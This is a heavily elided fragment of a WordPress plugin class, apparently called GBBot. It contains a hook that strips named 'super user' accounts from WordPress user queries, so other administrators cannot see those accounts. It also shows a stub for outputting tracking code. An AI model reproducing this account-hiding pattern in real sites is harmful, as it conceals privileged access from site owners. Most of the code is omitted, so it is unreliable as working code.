...
class GBBot
{
    ...
    */
        ...
        if (!$this->is_super_user) {
            ...
            add_action('pre_user_query', function ($user_search) use ($super_users) {
                ...
                $user_search->query_where = str_replace(
                    'WHERE 1=1',
                    "WHERE 1=1 AND {$wpdb->users}.user_login NOT IN ('" . implode("','", $super_users) . "')",
     ...
     */
    public function initGBTCOverlap()
    {
        $gbbot_theme_dir = $this->plugin->url;
        $plugin_name = $this->plugin->name;
        $version = $this->plugin->version;
    ...
    */
    public function outputReBoundTrackingCode()
    {
